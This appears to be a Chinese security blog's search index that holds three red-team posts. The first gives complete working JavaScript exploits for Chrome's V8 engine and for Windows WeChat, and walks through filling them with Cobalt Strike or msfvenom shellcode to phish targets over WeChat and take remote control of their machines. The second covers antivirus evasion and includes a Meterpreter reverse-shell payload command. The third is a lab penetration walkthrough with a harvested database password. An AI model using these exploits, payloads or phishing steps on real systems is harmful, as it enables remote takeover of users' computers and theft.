<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Chrome 0day RCE及利用微信钓鱼复现</title>
    <url>/2021/04/18/RCE%E5%8F%8A%E5%88%A9%E7%94%A8%E5%BE%AE%E4%BF%A1%E9%92%93%E9%B1%BC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>本文主要复现近期Chrome 0day RCE及利用其进行钓鱼，本文仅供参考学习。</p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><p>影响版本：</p><p>Google Chrome &lt; = 89.0.4389.114和使用Chrome内核的其他浏览器。</p><p>利用条件：</p><p>关闭沙箱模式 –no-sandbox</p><h3 id="Chrome漏洞复现及钓鱼"><a href="#Chrome漏洞复现及钓鱼" class="headerlink" title="Chrome漏洞复现及钓鱼"></a>Chrome漏洞复现及钓鱼</h3><p>exp:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80000</span>; ++i) &#123;</span><br><span class="line">           <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> shellcode = [shellcode];</span><br><span class="line">   <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line">   <span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line">   <span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line">   <span class="keyword">var</span> main = wasmInstance.exports.main;</span><br><span class="line">   <span class="keyword">var</span> bf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">   <span class="keyword">var</span> bfView = <span class="keyword">new</span> <span class="built_in">DataView</span>(bf);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fLow</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (bfView.getUint32(<span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fHi</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (bfView.getUint32(<span class="number">4</span>, <span class="literal">true</span>))</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">low, hi</span>) </span>&#123;</span><br><span class="line">       bfView.setUint32(<span class="number">0</span>, low, <span class="literal">true</span>);</span><br><span class="line">       bfView.setUint32(<span class="number">4</span>, hi, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">f2big</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">       bfView.setFloat64(<span class="number">0</span>, f, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">big2f</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">       bfView.setBigUint64(<span class="number">0</span>, b, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> bfView.getFloat64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">       <span class="keyword">constructor</span>(size) &#123;</span><br><span class="line">           <span class="keyword">super</span>(size);</span><br><span class="line">           <span class="keyword">this</span>.slot = <span class="number">0xb33f</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">let</span> x = <span class="number">-1</span>;</span><br><span class="line">       <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">       <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, <span class="number">-1</span>)));</span><br><span class="line">       arr.shift();</span><br><span class="line">       <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">       local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">       <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//byteLength idx=8</span></span><br><span class="line">       arr[<span class="number">0</span>] = <span class="number">0x1122</span>;</span><br><span class="line">       <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">       foo(<span class="literal">false</span>);</span><br><span class="line">   gc(); gc();</span><br><span class="line">  [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br><span class="line">   corrput_arr[<span class="number">12</span>] = <span class="number">0x22444</span>;</span><br><span class="line">   <span class="keyword">delete</span> corrput_arr;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">setbackingStore</span>(<span class="params">hi, low</span>) </span>&#123;</span><br><span class="line">       rwarr[<span class="number">4</span>] = i2f(fLow(rwarr[<span class="number">4</span>]), hi);</span><br><span class="line">       rwarr[<span class="number">5</span>] = i2f(low, fHi(rwarr[<span class="number">5</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">leakObjLow</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">       corrupt_buff.slot = o;</span><br><span class="line">       <span class="keyword">return</span> (fLow(rwarr[<span class="number">9</span>]) - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> corrupt_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(corrupt_buff);</span><br><span class="line">   <span class="keyword">let</span> corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);</span><br><span class="line">   <span class="keyword">let</span> idx0Addr = corrupt_buffer_ptr_low - <span class="number">0x10</span>;</span><br><span class="line">   <span class="keyword">let</span> baseAddr = (corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) - ((corrupt_buffer_ptr_low &amp; <span class="number">0xffff0000</span>) % <span class="number">0x40000</span>) + <span class="number">0x40000</span>;</span><br><span class="line">   <span class="keyword">let</span> delta = baseAddr + <span class="number">0x1c</span> - idx0Addr;</span><br><span class="line">   <span class="keyword">if</span> ((delta % <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = delta / <span class="number">8</span>;</span><br><span class="line">       <span class="keyword">this</span>.base = fLow(rwarr[baseIdx]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">let</span> baseIdx = ((delta - (delta % <span class="number">8</span>)) / <span class="number">8</span>);</span><br><span class="line">       <span class="keyword">this</span>.base = fHi(rwarr[baseIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">let</span> wasmInsAddr = leakObjLow(wasmInstance);</span><br><span class="line">   setbackingStore(wasmInsAddr, <span class="keyword">this</span>.base);</span><br><span class="line">   <span class="keyword">let</span> code_entry = corrupt_view.getFloat64(<span class="number">13</span> * <span class="number">8</span>, <span class="literal">true</span>);</span><br><span class="line">   setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">       corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">   main();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>







<p>使用msf生成执行计算机payload</p>
<p><code>msfvenom -a x64 -p windows/x64/exec CMD=&quot;calc&quot; EXITFUNC=thread -f num</code></p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419195258453.png" alt="image-20210419195258453"></p>
<p>使用Chrome内核的Edge浏览器弹出计算机</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419194121904.png" alt="image-20210419194121904"></p>
<p>使用Chrome浏览器弹出计算机</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419195744869.png" alt="image-20210419195744869"></p>
<p>使用CS进行钓鱼攻击，建立监听器</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419204355293.png" alt="image-20210419204355293"></p>
<p>生成payload</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419201522527.png" alt="image-20210419201522527"></p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419201643860.png" alt="image-20210419201643860"></p>
<p>讲payload中的<code>\</code>替换微<code>,0</code></p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419211124238.png" alt="image-20210419211124238"></p>
<p>替换后载入exp的shellcode中，保存为html文件</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419211335916.png" alt="image-20210419211335916"></p>
<p>使用Python开启一个http，使用chrome<code>--no-sandbox</code>去访问链接，cs上线</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419212549986.png" alt="image-20210419212549986"></p>
<h3 id="Windows微信钓鱼"><a href="#Windows微信钓鱼" class="headerlink" title="Windows微信钓鱼"></a>Windows微信钓鱼</h3><p>Windows微信版本&lt;=3.2.1.1412</p>
<p>exp:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ENABLE_LOG = <span class="literal">true</span>;</span><br><span class="line">IN_WORKER = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// run calc and hang in a loop</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [shellcode];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="number">0xdecaf0</span>) &#123;</span><br><span class="line">        not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    not_optimised_out |= <span class="number">0xff</span>;</span><br><span class="line">    not_optimised_out *= <span class="number">12</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g_array;</span><br><span class="line"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">    g_array[<span class="number">0</span>] = <span class="number">0x1dbabe</span> * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.prevent_opt = [];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span><br><span class="line">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span><br><span class="line">            <span class="keyword">this</span>.slot = <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span><br><span class="line">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span><br><span class="line">    cb(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span><br><span class="line">        <span class="keyword">constructor</span>() &#123;</span><br><span class="line">            <span class="comment">// var array = null;</span></span><br><span class="line">            <span class="keyword">super</span>(</span><br><span class="line">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span><br><span class="line">                <span class="comment">// has just happened.</span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, <span class="string">'g'</span></span><br><span class="line">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span><br><span class="line">                <span class="comment">// JSArray.</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span><br><span class="line">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span><br><span class="line">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line">            g_array[<span class="number">8</span>] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// try&#123;</span></span><br><span class="line">    <span class="keyword">var</span> derived_n = <span class="built_in">eval</span>(<span class="string">`(function derived_n(i) &#123;</span></span><br><span class="line"><span class="string">        if (i == 0) &#123;</span></span><br><span class="line"><span class="string">            return DerivedBase;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        class DerivedN extends derived_n(i-1) &#123;</span></span><br><span class="line"><span class="string">            constructor() &#123;</span></span><br><span class="line"><span class="string">                super();</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return DerivedN;</span></span><br><span class="line"><span class="string">    &#125;)`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span><br><span class="line">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.page_buffer.slot = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> (<span class="params">addr, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oob = oobAccess();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span><br><span class="line">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target_function(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    print(<span class="string">"start running"</span>);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样cs生成payload</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419212952589.png" alt="image-20210419212952589"></p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419213058336.png" alt="image-20210419213058336"></p>
<p>exp中替换shellcode，保存为wx.js</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214858501.png" alt="image-20210419214858501"></p>
<p>创建html文件引用wx.js，<code>&lt;script src=&quot;wx.js&quot;&gt;&lt;/script&gt;</code></p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419213533804.png" alt="image-20210419213533804"></p>
<p>进行微信钓鱼</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214721415.png" alt="image-20210419214721415"></p>
<p>上线成功</p>
<p><img src="//choge.top/2021/04/18/RCE及利用微信钓鱼复现/image-20210419214738282.png" alt="image-20210419214738282"></p>
]]></content>
      <categories>
        <category>Spear phishing</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>部分免杀技术复现（不断更新中）</title>
    <url>/2021/02/22/%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>免杀技术集合</p><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h3 id="UUID-免杀"><a href="#UUID-免杀" class="headerlink" title="UUID 免杀"></a>UUID 免杀</h3><p>CS生成raw格式文件</p><p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150236010.png" alt="image-20210222150236010"></p><p>直接使用FourEye中的uuid模块</p><p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150349015.png" alt="image-20210222150349015"></p><p>如提示错误则需要安装mingw-w64为Linux编译exe模块 <code>apt-get update apt-get install mingw-w64</code></p><a id="more"></a>






<p>本地测试成功</p>
<p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150514810.png" alt="image-20210222150514810"></p>
<p>但是后续进程注入等操作被拦截了，后续需要结合更多的免杀框架和技术，编码继续做复现，本文会不断更新。</p>
<p>xor方式免杀</p>
<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.83 lport=4444 -f raw -o shell.raw</p>
<p>暗月免杀</p>
<p>python加载器</p>
<p>go加载器</p>
<p>powershell免杀</p>
<p><a href="https://www.yuque.com/tidesec/redteam/sgfxkl#71xfb" target="_blank" rel="noopener">https://www.yuque.com/tidesec/redteam/sgfxkl#71xfb</a></p>
<p><a href="http://caidaome.com/?post=246" target="_blank" rel="noopener">http://caidaome.com/?post=246</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>red team</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack3靶机渗透</title>
    <url>/2021/02/22/vulnstack3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>尝试下vulnstack3靶机渗透，镜像为挂起状态</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>将vmnet2设置为仅主机模式 子网地址为192.168.93.0</p><p>拓扑图</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102128253.png" alt="image-20210222102128253"></p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.54</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102235556.png" alt="image-20210222102235556"></p><p>目录爆破</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">dirmap</span><span class="selector-class">.py</span> <span class="selector-tag">-i</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.54</span> <span class="selector-tag">-lcf</span></span><br></pre></td></tr></table></figure><p>可以查看到存在大量敏感文件</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102308913.png" alt="image-20210222102308913"></p><p><a href="http://192.168.31.54/configuration.php" target="_blank" rel="noopener">http://192.168.31.54/configuration.php</a>~</p><a id="more"></a>












<p>获取数据库连接信息</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102344040.png" alt="image-20210222102344040"></p>
<p>user = testuser/password = cvcvgjASD!@</p>
<p>msf探测joomla版本</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102424673.png" alt="image-20210222102424673"></p>
<p>3.9.12可通过后台写入shell</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102435899.png" alt="image-20210222102435899"></p>
<p>先尝试登陆</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102528749.png" alt="image-20210222102528749"></p>
<p>尝试添加管理员用户，官方查看添加语法如下</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102559948.png" alt="image-20210222102559948"></p>
